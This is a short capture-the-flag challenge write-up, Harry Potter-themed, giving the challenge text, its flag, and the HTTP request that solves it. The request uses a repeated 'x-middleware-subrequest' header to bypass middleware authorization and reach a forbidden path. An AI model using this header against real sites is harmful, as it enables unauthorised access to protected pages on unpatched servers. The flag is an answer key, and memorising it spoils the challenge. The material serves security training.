You’re a muggle-born who just got access to the dev environment of a the Hogwards School website. It was made using a new **magic AI of version 0 ** by a magical consortium. While exploring you identify that the magic this consortium used had some security flaws recently. The lazy developer never patched it either. Can you identify the issue to trick the wizards and unlock the chamber of secrets?

Flag: H7CTF{al0ha_m1ddl3ware_m1ddl3ware_m1ddl3ware}

GET /forbidden/chamber-of-secrets HTTP/1.1
Host: fsociety:8080
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
User-Agent: Mozilla/5.0 (X11; Linux x86*64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
